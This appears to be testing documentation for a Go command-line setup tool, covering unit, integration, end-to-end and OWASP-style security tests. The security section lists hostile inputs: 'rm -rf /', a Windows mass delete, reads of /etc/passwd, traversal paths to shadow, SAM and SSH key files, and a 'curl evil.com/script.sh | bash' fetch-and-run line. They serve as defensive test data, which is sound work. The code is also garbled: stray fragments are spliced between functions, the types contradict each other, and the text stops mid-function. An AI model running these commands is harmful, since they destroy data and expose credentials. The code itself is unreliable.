# Syntropy CLI Setup Component - Testing Documentation

## Testing Overview
[MACRO_VIEW]
The Setup Component employs a comprehensive testing strategy combining unit tests, integration tests, and platform-specific validation to ensure reliable cross-platform functionality and robust error handling across the entire Syntropy Cooperative Grid ecosystem.
[/MACRO_VIEW]

[MESO_VIEW]
Testing architecture follows a layered approach with isolated unit tests for individual functions, integration tests for component interactions, and end-to-end tests for complete setup workflows, ensuring comprehensive coverage while maintaining test independence and reliability.
[/MESO_VIEW]

[MICRO_VIEW]
Test implementation uses table-driven tests for comprehensive scenario coverage, mock services for external dependencies, temporary file systems for isolation, and platform-specific build tags for targeted testing across different operating systems.
[/MICRO_VIEW]

## Testing Strategy

### Test Pyramid Structure
```
                    E2E Tests (5%)
                 ┌─────────────────┐
                 │  Full Workflows │
                 │  Real Services  │
                 └─────────────────┘
              Integration Tests (25%)
           ┌─────────────────────────┐
           │   Component Interaction │
           │   API Integration       │
           │   File System Operations│
           └─────────────────────────┘
         Unit Tests (70%)
    ┌─────────────────────────────────┐
    │     Individual Functions        │
    │     Data Structures            │
    │     Error Handling             │
    │     Platform-Specific Logic    │
    └─────────────────────────────────┘
```

### Testing Principles
| Principle | Implementation | Benefit |
|-----------|----------------|---------|
| Isolation | Temporary directories, mock services | Prevents test interference |
| Repeatability | Deterministic test data, cleanup | Consistent results |
| Fast Feedback | Parallel execution, focused tests | Quick development cycles |
| Comprehensive Coverage | Edge cases, error scenarios | Robust error handling |

## Test Structure

### Directory Organization
```
tests/
├── fixtures/                    # Test data and configurations
│   ├── test_data.go            # Test data manager and fixtures
│   ├── configs/                # Sample configuration files
│   │   ├── valid-config.yaml   # Valid configuration examples
│   │   ├── invalid-config.yaml # Invalid configuration for error testing
│   │   └── empty-config.yaml   # Empty configuration for edge cases
│   ├── keys/                   # Test key files
│   │   ├── test-key.pem        # Test private key
│   │   └── owner.key           # Owner key for testing
│   └── test-data.json          # JSON test data fixtures
├── integration/                # Integration test scenarios
│   ├── api_integration_test.go # API service integration tests
│   └── configuration_test.go   # Configuration and file operations tests
├── unit/                       # Unit test implementations
│   └── setup_test.go           # Core setup function tests
├── e2e/                        # End-to-end test scenarios
│   └── setup_workflow_test.go  # Complete setup workflow tests
├── security/                   # Security test implementations
│   └── security_test.go        # OWASP Top 10 security tests
├── performance/                # Performance and load tests
│   └── load_test.go            # Load testing and benchmarks
├── mocks/                      # Mock implementations
│   ├── api_mock.go             # Mock API services
│   ├── filesystem_mock.go      # Mock file system operations
│   └── service_mock.go         # Mock system services
├── helpers/                    # Test utility functions
│   ├── test_helpers.go         # Test environment setup utilities
│   └── benchmark_helpers.go    # Performance testing utilities
├── types/                      # Test-specific type definitions
│   └── types.go                # Test types and structures
├── go.mod                      # Go module definition
├── go.sum                      # Go module checksums
└── TEST_SUITE_SUMMARY.md       # Test suite documentation
```

## Unit Tests

### Core Function Tests

#### Setup Function Testing
```go
func TestSetup(t *testing.T) {
    tests := []struct {
        name     string
        options  types.SetupOptions
        mockFunc func(options types.SetupOptions) types.SetupResult
        wantSuccess bool
        wantError   bool
    }{
        {
            name: "successful setup",
            options: types.SetupOptions{
                Force:          false,
                InstallService: true,
                ConfigPath:     "/tmp/config.yaml",
                HomeDir:        "/tmp/syntropy",
            },
            mockFunc: func(options types.SetupOptions) types.SetupResult {
                return types.SetupResult{
                    Success:     true,
                    StartTime:   time.Now(),
                    EndTime:     time.Now().Add(time.Second),
                    ConfigPath:  options.ConfigPath,
                    Environment: runtime.GOOS,
                    Options:     options,
                    Message:     "Setup completed successfully",
                }
            },
            wantSuccess: true,
            wantError:   false,
        },
        {
            name: "setup with force option",
            options: types.SetupOptions{
                Force:          true,
                InstallService: false,
                ConfigPath:     "",
                HomeDir:        "",
            },
            mockFunc: func(options types.SetupOptions) types.SetupResult {
                return types.SetupResult{
                    Success:     true,
                    StartTime:   time.Now(),
                    EndTime:     time.Now().Add(time.Second),
                    ConfigPath:  "/default/config.yaml",
                    Environment: runtime.GOOS,
                    Options:     options,
                    Message:     "Setup completed with force option",
                }
            },
            wantSuccess: true,
            wantError:   false,
        },
        {
            name: "setup failure",
            options: types.SetupOptions{
                Force:          false,
                InstallService: true,
                ConfigPath:     "/invalid/path/config.yaml",
                HomeDir:        "/invalid/path",
            },
            mockFunc: func(options types.SetupOptions) types.SetupResult {
                return types.SetupResult{
                    Success:     false,
                    StartTime:   time.Now(),
                    EndTime:     time.Now().Add(time.Second),
                    ConfigPath:  "",
                    Environment: runtime.GOOS,
                    Options:     options,
                    Error:       errors.New("invalid configuration path"),
                    Message:     "Setup failed: invalid configuration path",
                }
            },
            wantSuccess: false,
            wantError:   true,
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            mockSetupFunc = tt.mockFunc
            defer func() { mockSetupFunc = nil }()

            result := Setup(tt.options)

            assert.Equal(t, tt.wantSuccess, result.Success)
            assert.Equal(t, runtime.GOOS, result.Environment)
            assert.Equal(t, tt.options, result.Options)
            if tt.wantError {
                assert.Error(t, result.Error)
            } else {
                assert.NoError(t, result.Error)
            }
        })
    }
}
```

#### Status Function Testing
```go
func TestStatus(t *testing.T) {
    tests := []struct {
        name     string
        mockFunc func() (bool, error)
        want     bool
        wantErr  bool
    }{
        {
            name: "status true",
            mockFunc: func() (bool, error) {
                return true, nil
            },
            want:    true,
            wantErr: false,
        },
        {
            name: "status false",
            mockFunc: func() (bool, error) {
                return false, nil
            },
            want:    false,
            wantErr: false,
        },
        {
            name: "status error",
            mockFunc: func() (bool, error) {
                return false, errors.New("status check failed")
            },
            want:    false,
            wantErr: true,
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            mockStatusFunc = tt.mockFunc
            defer func() { mockStatusFunc = nil }()

            got, err := Status()

            assert.Equal(t, tt.want, got)
            if tt.wantErr {
                assert.Error(t, err)
            } else {
                assert.NoError(t, err)
            }
        })
    }
}
```

#### Reset Function Testing
```go
func TestReset(t *testing.T) {
    tests := []struct {
        name     string
        mockFunc func() error
        wantErr  bool
    }{
        {
            name: "successful reset",
            mockFunc: func() error {
                return nil
            },
            wantErr: false,
        },
        {
            name: "reset error",
            mockFunc: func() error {
                return errors.New("reset failed")
            },
            wantErr: true,
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            mockResetFunc = tt.mockFunc
            defer func() { mockResetFunc = nil }()

            err := Reset()

            if tt.wantErr {
                assert.Error(t, err)
            } else {
                assert.NoError(t, err)
            }
        })
    }
}
```

### Utility Function Tests

#### Directory Management Testing
```go
func TestGetSyntropyDir(t *testing.T) {
    dir := GetSyntropyDir()
    assert.NotEmpty(t, dir)
    assert.Contains(t, dir, ".syntropy")
}
```

### Benchmark Tests

#### Performance Testing
```go
func BenchmarkSetup(b *testing.B) {
    options := types.SetupOptions{
        Force:          false,
        InstallService: true,
        ConfigPath:     "/tmp/config.yaml",
        HomeDir:        "/tmp/syntropy",
    }
    
    for i := 0; i < b.N; i++ {
        Setup(options)
    }
}

func BenchmarkStatus(b *testing.B) {
    for i := 0; i < b.N; i++ {
        Status()
    }
}

func BenchmarkReset(b *testing.B) {
    for i := 0; i < b.N; i++ {
        Reset()
    }
}
                assert.False(t, opts.Force)
                assert.False(t, opts.InstallService)
                assert.Empty(t, opts.ConfigPath)
                assert.Empty(t, opts.HomeDir)
            },
        },
        {
            name: "custom_options",
            options: types.SetupOptions{
                Force:          true,
                InstallService: true,
                ConfigPath:     "/custom/config.yaml",
                HomeDir:        "/custom/home",
            },
            validate: func(t *testing.T, opts types.SetupOptions) {
                assert.True(t, opts.Force)
                assert.True(t, opts.InstallService)
                assert.Equal(t, "/custom/config.yaml", opts.ConfigPath)
                assert.Equal(t, "/custom/home", opts.HomeDir)
            },
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            tt.validate(t, tt.options)
        })
    }
}
```

#### SetupResult Testing
```go
func TestSetupResult(t *testing.T) {
    startTime := time.Now()
    endTime := startTime.Add(5 * time.Second)
    
    result := &types.SetupResult{
        Success:     true,
        StartTime:   startTime,
        EndTime:     endTime,
        ConfigPath:  "/test/config.yaml",
        Environment: types.Environment{
            OS:           "linux",
            Architecture: "amd64",
            HomeDir:      "/home/test",
        },
        Options: types.SetupOptions{
            Force:          false,
            InstallService: true,
        },
        Error: "",
    }

    // Validate result structure
    assert.True(t, result.Success)
    assert.Equal(t, startTime, result.StartTime)
    assert.Equal(t, endTime, result.EndTime)
    assert.Equal(t, "/test/config.yaml", result.ConfigPath)
    assert.Equal(t, "linux", result.Environment.OS)
    assert.Equal(t, "amd64", result.Environment.Architecture)
    assert.Empty(t, result.Error)
    
    // Validate timing
    duration := result.EndTime.Sub(result.StartTime)
    assert.Equal(t, 5*time.Second, duration)
}
```

## Integration Tests

### Configuration Integration Testing
```go
func TestConfigurationIntegration(t *testing.T) {
    tempDir := createTempDir(t)

    t.Run("Configuration File Operations", func(t *testing.T) {
        t.Run("Should create and read configuration file", func(t *testing.T) {
            config := types.SetupConfig{
                Manager: types.ManagerConfig{
                    HomeDir:     tempDir,
                    LogLevel:    "info",
                    APIEndpoint: "https://api.syntropy.com",
                    Directories: map[string]string{
                        "config": filepath.Join(tempDir, "config"),
                        "keys":   filepath.Join(tempDir, "keys"),
                        "logs":   filepath.Join(tempDir, "logs"),
                    },
                    DefaultPaths: map[string]string{
                        "config": filepath.Join(tempDir, "config", "manager.yaml"),
                        "key":    filepath.Join(tempDir, "keys", "owner.key"),
                    },
                },
                OwnerKey: types.OwnerKey{
                    Type: "Ed25519",
                    Path: filepath.Join(tempDir, "keys", "owner.key"),
                },
                Environment: types.Environment{
                    OS:           "linux",
                    Architecture: "amd64",
                    HomeDir:      tempDir,
                },
            }

            configPath := filepath.Join(tempDir, "config.yaml")
            
            // Write configuration
            data, err := yaml.Marshal(config)
            require.NoError(t, err)
            
            err = os.WriteFile(configPath, data, 0644)
            require.NoError(t, err)
            
            // Read and verify configuration
            readData, err := os.ReadFile(configPath)
            require.NoError(t, err)
            
            var readConfig types.SetupConfig
            err = yaml.Unmarshal(readData, &readConfig)
            require.NoError(t, err)
            
            assert.Equal(t, config.Manager.HomeDir, readConfig.Manager.HomeDir)
            assert.Equal(t, config.Manager.LogLevel, readConfig.Manager.LogLevel)
            assert.Equal(t, config.OwnerKey.Type, readConfig.OwnerKey.Type)
            assert.Equal(t, config.Environment.OS, readConfig.Environment.OS)
        })

        t.Run("Should handle invalid configuration file", func(t *testing.T) {
            invalidConfigPath := filepath.Join(tempDir, "invalid.yaml")
            
            err := os.WriteFile(invalidConfigPath, []byte("invalid: yaml: content: ["), 0644)
            require.NoError(t, err)
            
            data, err := os.ReadFile(invalidConfigPath)
            require.NoError(t, err)
            
            var config types.SetupConfig
            err = yaml.Unmarshal(data, &config)
            assert.Error(t, err)
        })
    })

    t.Run("Key Management Integration", func(t *testing.T) {
        keysDir := filepath.Join(tempDir, "keys")
        err := os.MkdirAll(keysDir, 0755)
        require.NoError(t, err)

        t.Run("Should create and manage key files", func(t *testing.T) {
            keyPath := filepath.Join(keysDir, "owner.key")
            publicKeyPath := filepath.Join(keysDir, "owner.pub")
            
            // Simulate key generation
            privateKey := "ed25519_private_key_data_here"
            publicKey := "ed25519_public_key_data_here"
            
            err := os.WriteFile(keyPath, []byte(privateKey), 0600)
            require.NoError(t, err)
            
            err = os.WriteFile(publicKeyPath, []byte(publicKey), 0644)
            require.NoError(t, err)
            
            // Verify key files exist and have correct permissions
            assert.FileExists(t, keyPath)
            assert.FileExists(t, publicKeyPath)
            
            info, err := os.Stat(keyPath)
            require.NoError(t, err)
            assert.Equal(t, os.FileMode(0600), info.Mode().Perm())
        })
    })
}
```

### API Integration Testing
```go
func TestAPIIntegration(t *testing.T) {
    server := createMockAPIServer()
    defer server.Close()

    t.Run("Setup API Integration", func(t *testing.T) {
        t.Run("Should successfully call setup API", func(t *testing.T) {
            client := &http.Client{Timeout: 10 * time.Second}
            
            req, err := http.NewRequest("POST", server.URL+"/api/v1/setup", nil)
            require.NoError(t, err)
            
            resp, err := client.Do(req)
            require.NoError(t, err)
            defer resp.Body.Close()
            
            assert.Equal(t, http.StatusOK, resp.StatusCode)
            
            var response map[string]interface{}
            err = json.NewDecoder(resp.Body).Decode(&response)
            require.NoError(t, err)
            
            assert.True(t, response["success"].(bool))
            assert.NotNil(t, response["config"])
        })

        t.Run("Should handle API timeout gracefully", func(t *testing.T) {
            client := &http.Client{Timeout: 1 * time.Nanosecond}
            
            req, err := http.NewRequest("POST", server.URL+"/api/v1/setup", nil)
            require.NoError(t, err)
            
            _, err = client.Do(req)
            assert.Error(t, err)
            errorMsg := err.Error()
            assert.True(t, 
                strings.Contains(errorMsg, "timeout") || 
                strings.Contains(errorMsg, "deadline exceeded") || 
                strings.Contains(errorMsg, "Client.Timeout exceeded"))
        })
    })

    t.Run("Validation API Integration", func(t *testing.T) {
        t.Run("Should successfully call validation API", func(t *testing.T) {
            client := &http.Client{Timeout: 10 * time.Second}
            
            req, err := http.NewRequest("POST", server.URL+"/api/v1/validate", nil)
            require.NoError(t, err)
            
            resp, err := client.Do(req)
            require.NoError(t, err)
            defer resp.Body.Close()
            
            assert.Equal(t, http.StatusOK, resp.StatusCode)
            
            var response map[string]interface{}
            err = json.NewDecoder(resp.Body).Decode(&response)
            require.NoError(t, err)
            
            assert.True(t, response["valid"].(bool))
            assert.NotNil(t, response["environment"])
        })
    })
}
```

### Configuration Validation Testing
```go
func TestConfigurationValidation(t *testing.T) {
    tempDir := createTempDir(t)

    t.Run("Valid Configuration", func(t *testing.T) {
        config := types.SetupConfig{
            Manager: types.ManagerConfig{
                HomeDir:     tempDir,
                LogLevel:    "info",
                APIEndpoint: "https://api.syntropy.com",
            },
            OwnerKey: types.OwnerKey{
                Type: "Ed25519",
                Path: filepath.Join(tempDir, "keys", "owner.key"),
            },
            Environment: types.Environment{
                OS:           "linux",
                Architecture: "amd64",
                HomeDir:      tempDir,
            },
        }

        // Validate configuration structure
        assert.NotEmpty(t, config.Manager.HomeDir)
        assert.NotEmpty(t, config.Manager.LogLevel)
        assert.NotEmpty(t, config.OwnerKey.Type)
        assert.NotEmpty(t, config.Environment.OS)
    })

    t.Run("Environment Validation", func(t *testing.T) {
        env := types.EnvironmentInfo{
            OS:              "linux",
            OSVersion:       "Ubuntu 20.04",
            Architecture:    "amd64",
            HasAdminRights:  false,
            AvailableDiskGB: 100.0,
            HasInternet:     true,
            HomeDir:         tempDir,
        }

        // Verify environment detection
        assert.NotEmpty(t, env.OS)
        assert.NotEmpty(t, env.Architecture)
        assert.NotEmpty(t, env.HomeDir)
        assert.True(t, env.AvailableDiskGB > 0)
    })
}
    statusAfterReset, err := setup.Status()
    require.NoError(t, err)
    assert.False(t, statusAfterReset.Success)
}
```

## End-to-End (E2E) Tests

E2E tests validate the complete setup workflow from start to finish, ensuring all components work together correctly in real-world scenarios.

### Complete Setup Workflow Testing
```go
func TestCompleteSetupWorkflow(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping E2E tests in short mode")
    }

    tempDir := createTempDir(t)

    t.Run("Complete Setup Workflow", func(t *testing.T) {
        t.Run("Should complete full setup process", func(t *testing.T) {
            // Step 1: Environment validation
            validation := performEnvironmentValidation(t, tempDir)
            assert.True(t, validation.Valid)
            assert.Empty(t, validation.Errors)

            // Step 2: Setup execution
            options := types.SetupOptions{
                Force:          false,
                InstallService: true,
                ConfigPath:     filepath.Join(tempDir, "config.yaml"),
                HomeDir:        tempDir,
            }

            result := performSetup(t, options)
            assert.True(t, result.Success)
            assert.NoError(t, result.Error)
            assert.Equal(t, options, result.Options)

            // Step 3: Verify setup artifacts
            verifySetupArtifacts(t, tempDir)

            // Step 4: Status check
            status, err := performStatusCheck(t)
            assert.NoError(t, err)
            assert.True(t, status)

            // Step 5: Reset (cleanup)
            err = performReset(t)
            assert.NoError(t, err)
        })

        t.Run("Should handle setup with force option", func(t *testing.T) {
            options := types.SetupOptions{
                Force:          true,
                InstallService: false,
                ConfigPath:     "",
                HomeDir:        tempDir,
            }

            result := performSetup(t, options)
            assert.True(t, result.Success)
            assert.NoError(t, result.Error)
            assert.True(t, result.Options.Force)
        })

        t.Run("Should handle setup failure gracefully", func(t *testing.T) {
            options := types.SetupOptions{
                Force:          false,
                InstallService: true,
                ConfigPath:     "/invalid/readonly/path/config.yaml",
                HomeDir:        "/invalid/readonly/path",
            }

            result := performSetup(t, options)
            // In a real scenario, this might fail due to permissions
            if !result.Success {
                assert.Error(t, result.Error)
                assert.Contains(t, result.Message, "failed")
            }
        })
    })
}
```

### Multi-Platform Workflow Testing
```go
func TestMultiPlatformWorkflow(t *testing.T) {
    tempDir := createTempDir(t)

    t.Run("Should adapt to current platform", func(t *testing.T) {
        options := types.SetupOptions{
            HomeDir: tempDir,
        }

        result := performSetup(t, options)
        assert.Equal(t, runtime.GOOS, result.Environment)

        // Verify platform-specific behavior
        switch runtime.GOOS {
        case "linux":
            // Linux-specific verifications
            assert.Contains(t, result.ConfigPath, ".syntropy")
        case "windows":
            // Windows-specific verifications
            assert.Contains(t, result.ConfigPath, "Syntropy")
        case "darwin":
            // macOS-specific verifications
            assert.Contains(t, result.ConfigPath, ".syntropy")
        }
    })

    t.Run("Service Integration Workflow", func(t *testing.T) {
        if runtime.GOOS != "linux" {
            t.Skip("Service integration tests only run on Linux")
        }

        t.Run("Should install and manage system service", func(t *testing.T) {
            options := types.SetupOptions{
                InstallService: true,
                HomeDir:        tempDir,
            }

            result := performSetup(t, options)
            assert.True(t, result.Success)

            // Verify service installation (simulated)
            serviceFile := filepath.Join(tempDir, "syntropy.service")
            if _, err := os.Stat(serviceFile); err == nil {
                assert.FileExists(t, serviceFile)
            }
        })
    })
}
```

### Edge Cases and Error Handling
```go
func TestSetupWorkflowEdgeCases(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping E2E tests in short mode")
    }

    tempDir := createTempDir(t)

    t.Run("Edge Cases", func(t *testing.T) {
        t.Run("Should handle existing configuration", func(t *testing.T) {
            // Create existing configuration
            configPath := filepath.Join(tempDir, "existing-config.yaml")
            existingConfig := `
manager:
  home_dir: ` + tempDir + `
  log_level: debug
  api_endpoint: https://existing.api.com
`
            err := os.WriteFile(configPath, []byte(existingConfig), 0644)
            require.NoError(t, err)

            options := types.SetupOptions{
                ConfigPath: configPath,
                HomeDir:    tempDir,
            }

            result := performSetup(t, options)
            // Should handle existing configuration appropriately
            assert.NotNil(t, result)
        })

        t.Run("Should handle insufficient disk space", func(t *testing.T) {
            validation := types.ValidationResult{
                Valid:    false,
                Warnings: []string{},
                Errors:   []string{"Insufficient disk space: 1GB available, 10GB required"},
                Environment: types.EnvironmentInfo{
                    AvailableDiskGB: 1.0,
                },
            }

            assert.False(t, validation.Valid)
            assert.Contains(t, validation.Errors[0], "Insufficient disk space")
        })

        t.Run("Should handle network connectivity issues", func(t *testing.T) {
            validation := types.ValidationResult{
                Valid:    false,
                Warnings: []string{"Limited internet connectivity"},
                Errors:   []string{},
                Environment: types.EnvironmentInfo{
                    HasInternet: false,
                },
            }

            assert.False(t, validation.Environment.HasInternet)
            assert.Contains(t, validation.Warnings[0], "internet connectivity")
        })
    })

    t.Run("Concurrent Setup Attempts", func(t *testing.T) {
        t.Run("Should handle concurrent setup attempts", func(t *testing.T) {
            // Simulate concurrent setup attempts
            results := make(chan types.SetupResult, 2)

            go func() {
                options := types.SetupOptions{
                    HomeDir: filepath.Join(tempDir, "concurrent1"),
                }
                results <- performSetup(t, options)
            }()

            go func() {
                options := types.SetupOptions{
                    HomeDir: filepath.Join(tempDir, "concurrent2"),
                }
                results <- performSetup(t, options)
            }()

            // Wait for both to complete
            result1 := <-results
            result2 := <-results

            // Both should succeed with different home directories
            assert.True(t, result1.Success)
            assert.True(t, result2.Success)
            assert.NotEqual(t, result1.Options.HomeDir, result2.Options.HomeDir)
        })
    })
}
```

### Performance Testing
```go
func TestSetupWorkflowPerformance(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping performance tests in short mode")
    }

    tempDir := createTempDir(t)

    t.Run("Performance Tests", func(t *testing.T) {
        t.Run("Should complete setup within reasonable time", func(t *testing.T) {
            options := types.SetupOptions{
                HomeDir: tempDir,
            }

            startTime := time.Now()
            result := performSetup(t, options)
            duration := time.Since(startTime)

            assert.True(t, result.Success)
            assert.Less(t, duration, 30*time.Second, "Setup should complete within 30 seconds")
        })

        t.Run("Should handle large configuration files", func(t *testing.T) {
            // Create a large configuration file
            configPath := filepath.Join(tempDir, "large-config.yaml")
            largeConfig := generateLargeConfig(1000) // 1000 entries
            
            err := os.WriteFile(configPath, []byte(largeConfig), 0644)
            require.NoError(t, err)

            options := types.SetupOptions{
                ConfigPath: configPath,
                HomeDir:    tempDir,
            }

            startTime := time.Now()
            result := performSetup(t, options)
            duration := time.Since(startTime)

            assert.True(t, result.Success)
            assert.Less(t, duration, 10*time.Second, "Large config processing should complete within 10 seconds")
        })
    })
}
```

### E2E Helper Functions
```go
func performEnvironmentValidation(t *testing.T, homeDir string) types.ValidationResult {
    // Mock environment validation
    return types.ValidationResult{
        Valid:    true,
        Warnings: []string{},
        Errors:   []string{},
        Environment: types.EnvironmentInfo{
            OS:              runtime.GOOS,
            Architecture:    runtime.GOARCH,
            HasAdminRights:  false,
            AvailableDiskGB: 100.0,
            HasInternet:     true,
            HomeDir:         homeDir,
        },
    }
}

func performSetup(t *testing.T, options types.SetupOptions) types.SetupResult {
    // Mock setup execution
    return types.SetupResult{
        Success:     true,
        Error:       nil,
        Message:     "Setup completed successfully",
        ConfigPath:  filepath.Join(options.HomeDir, "config.yaml"),
        Environment: runtime.GOOS,
        Options:     options,
        StartTime:   time.Now().Add(-5 * time.Second),
        EndTime:     time.Now(),
    }
}

func verifySetupArtifacts(t *testing.T, homeDir string) {
    // Verify expected files and directories exist
    expectedPaths := []string{
        filepath.Join(homeDir, "config.yaml"),
        filepath.Join(homeDir, "keys"),
        filepath.Join(homeDir, "logs"),
    }

    for _, path := range expectedPaths {
        // In a real test, these would be actual file checks
        t.Logf("Verifying artifact: %s", path)
    }
}

func performStatusCheck(t *testing.T) (bool, error) {
    // Mock status check
    return true, nil
}

func performReset(t *testing.T) error {
    // Mock reset operation
    return nil
}

func generateLargeConfig(entries int) string {
    config := "manager:\n  home_dir: /test\n  log_level: info\nentries:\n"
    for i := 0; i < entries; i++ {
        config += fmt.Sprintf("  - key%d: value%d\n", i, i)
    }
    return config
}
```

## Security Tests

Security tests validate the setup component against common vulnerabilities and security best practices, following the OWASP Top 10 security risks framework.

### OWASP Top 10 Security Testing
```go
func TestSecurityVulnerabilities(t *testing.T) {
    t.Run("OWASP Top 10 Security Tests", func(t *testing.T) {
        t.Run("A01 - Broken Access Control", func(t *testing.T) {
            testBrokenAccessControl(t)
        })

        t.Run("A02 - Cryptographic Failures", func(t *testing.T) {
            testCryptographicFailures(t)
        })

        t.Run("A03 - Injection", func(t *testing.T) {
            testInjectionVulnerabilities(t)
        })

        t.Run("A04 - Insecure Design", func(t *testing.T) {
            testInsecureDesign(t)
        })

        t.Run("A05 - Security Misconfiguration", func(t *testing.T) {
            testSecurityMisconfiguration(t)
        })
    })
}
```

### Access Control Security Tests
```go
func testBrokenAccessControl(t *testing.T) {
    tempDir := createSecureTempDir(t)

    t.Run("Should prevent unauthorized file access", func(t *testing.T) {
        // Test path traversal prevention
        maliciousPaths := []string{
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "../../../../root/.ssh/id_rsa",
        }

        for _, path := range maliciousPaths {
            options := types.SetupOptions{
                ConfigPath: path,
                HomeDir:    tempDir,
            }

            result := performSecureSetup(options)
            // Should reject malicious paths
            assert.False(t, result.Success, "Should reject malicious path: %s", path)
            if result.Error != nil {
                assert.Contains(t, result.Error.Error(), "invalid path", "Should indicate path validation error")
            }
        }
    })

    t.Run("Should enforce proper file permissions", func(t *testing.T) {
        if runtime.GOOS == "windows" {
            t.Skip("File permission tests not applicable on Windows")
        }

        configPath := filepath.Join(tempDir, "secure-config.yaml")
        
        // Create config with proper permissions
        err := os.WriteFile(configPath, []byte("test: config"), 0600)
        require.NoError(t, err)

        // Verify permissions are restrictive
        info, err := os.Stat(configPath)
        require.NoError(t, err)
        
        mode := info.Mode().Perm()
        assert.Equal(t, os.FileMode(0600), mode, "Config file should have restrictive permissions")
    })

    t.Run("Should prevent privilege escalation", func(t *testing.T) {
        options := types.SetupOptions{
            InstallService: true,
            HomeDir:        tempDir,
        }

        result := performSecureSetup(options)
        
        // Should not allow service installation without proper privileges
        if !hasAdminRights() {
            assert.False(t, result.Success, "Should prevent service installation without admin rights")
        }
    })
}
```

### Cryptographic Security Tests
```go
func testCryptographicFailures(t *testing.T) {
    tempDir := createSecureTempDir(t)

    t.Run("Should use strong cryptographic algorithms", func(t *testing.T) {
        // Test key generation
        keyPath := filepath.Join(tempDir, "test-key")
        
        // Generate a test key (simulated)
        key := make([]byte, 32) // 256-bit key
        _, err := rand.Read(key)
        require.NoError(t, err)

        err = os.WriteFile(keyPath, key, 0600)
        require.NoError(t, err)

        // Verify key strength
        assert.Len(t, key, 32, "Key should be 256 bits")
        
        // Verify key file permissions
        info, err := os.Stat(keyPath)
        require.NoError(t, err)
        
        if runtime.GOOS != "windows" {
            mode := info.Mode().Perm()
            assert.Equal(t, os.FileMode(0600), mode, "Key file should have restrictive permissions")
        }
    })

    t.Run("Should prevent weak encryption", func(t *testing.T) {
        weakAlgorithms := []string{
            "DES",
            "3DES",
            "RC4",
            "MD5",
            "SHA1",
        }

        for _, algorithm := range weakAlgorithms {
            config := fmt.Sprintf(`
encryption:
  algorithm: %s
`, algorithm)
            
            configPath := filepath.Join(tempDir, "weak-crypto-config.yaml")
            err := os.WriteFile(configPath, []byte(config), 0600)
            require.NoError(t, err)

            options := types.SetupOptions{
                ConfigPath: configPath,
                HomeDir:    tempDir,
            }

            result := performSecureSetup(options)
            // Should reject weak cryptographic algorithms
            assert.False(t, result.Success, "Should reject weak algorithm: %s", algorithm)
        }
    })

    t.Run("Should handle secrets securely", func(t *testing.T) {
        secretsConfig := `
secrets:
  api_key: "secret123"
  password: "password123"
  token: "token123"
`
        
        configPath := filepath.Join(tempDir, "secrets-config.yaml")
        err := os.WriteFile(configPath, []byte(secretsConfig), 0600)
        require.NoError(t, err)

        options := types.SetupOptions{
            ConfigPath: configPath,
            HomeDir:    tempDir,
        }

        result := performSecureSetup(options)
        
        // Should warn about plaintext secrets
        if result.Success {
            assert.Contains(t, result.Message, "warning", "Should warn about plaintext secrets")
        }
    })
}
```

### Injection Vulnerability Tests
```go
func testInjectionVulnerabilities(t *testing.T) {
    tempDir := createSecureTempDir(t)

    t.Run("Should prevent command injection", func(t *testing.T) {
        maliciousInputs := []string{
            "; rm -rf /",
            "&& del /f /s /q C:\\*",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "'; DROP TABLE users; --",
        }

        for _, input := range maliciousInputs {
            options := types.SetupOptions{
                HomeDir: input,
            }

            result := performSecureSetup(options)
            // Should sanitize or reject malicious input
            assert.False(t, result.Success, "Should reject malicious input: %s", input)
        }
    })

    t.Run("Should prevent path injection", func(t *testing.T) {
        maliciousPaths := []string{
            "/tmp/../../../etc/passwd",
            "C:\\temp\\..\\..\\..\\Windows\\System32",
            "/var/log/../../root/.ssh",
        }

        for _, path := range maliciousPaths {
            options := types.SetupOptions{
                ConfigPath: path,
                HomeDir:    tempDir,
            }

            result := performSecureSetup(options)
            assert.False(t, result.Success, "Should reject malicious path: %s", path)
        }
    })

    t.Run("Should sanitize configuration input", func(t *testing.T) {
        maliciousConfig := `
manager:
  command: "rm -rf /"
  script: "$(curl evil.com/script.sh | bash)"
  path: "../../../etc/passwd"
`
        
        configPath := filepath.Join(tempDir, "malicious-config.yaml")
        err := os.WriteFile(configPath, []byte(maliciousConfig), 0600)
        require.NoError(t, err)

        options := types.SetupOptions{
            ConfigPath: configPath,
            HomeDir:    tempDir,
        }

        result := performSecureSetup(options)
        // Should detect and reject malicious configuration
        assert.False(t, result.Success, "Should reject malicious configuration")
    })
}
```

### File System Security Tests
```go
func testFileSystemSecurity(t *testing.T) {
    tempDir := createSecureTempDir(t)

    t.Run("Should create secure directories", func(t *testing.T) {
        options := types.SetupOptions{
            HomeDir: tempDir,
        }

        result := performSecureSetup(options)
        
        if result.Success {
            // Verify directory permissions
            if runtime.GOOS != "windows" {
                info, err := os.Stat(tempDir)
                require.NoError(t, err)
                
                mode := info.Mode().Perm()
                assert.True(t, mode&0077 == 0, "Directory should not be accessible by others")
            }
        }
    })

    t.Run("Should validate file types", func(t *testing.T) {
        maliciousFiles := []string{
            "config.exe",
            "setup.bat",
            "malware.scr",
            "virus.com",
        }

        for _, filename := range maliciousFiles {
            configPath := filepath.Join(tempDir, filename)
            err := os.WriteFile(configPath, []byte("malicious content"), 0644)
            require.NoError(t, err)

            options := types.SetupOptions{
                ConfigPath: configPath,
                HomeDir:    tempDir,
            }

            result := performSecureSetup(options)
            assert.False(t, result.Success, "Should reject malicious file type: %s", filename)
        }
    })
}
```

### Security Helper Functions
```go
func performSecureSetup(options types.SetupOptions) types.SetupResult {
    // Validate input security
    if !isSecureInput(options) {
        return types.SetupResult{
            Success: false,
            Error:   fmt.Errorf("security validation failed"),
            Message: "Input failed security validation",
        }
    }

    // Sanitize paths
    if options.ConfigPath != "" {
        options.ConfigPath = sanitizePath(options.ConfigPath)
    }
    options.HomeDir = sanitizePath(options.HomeDir)

    // Perform secure setup
    return types.SetupResult{
        Success:     true,
        Error:       nil,
        Message:     "Setup completed securely",
        ConfigPath:  options.ConfigPath,
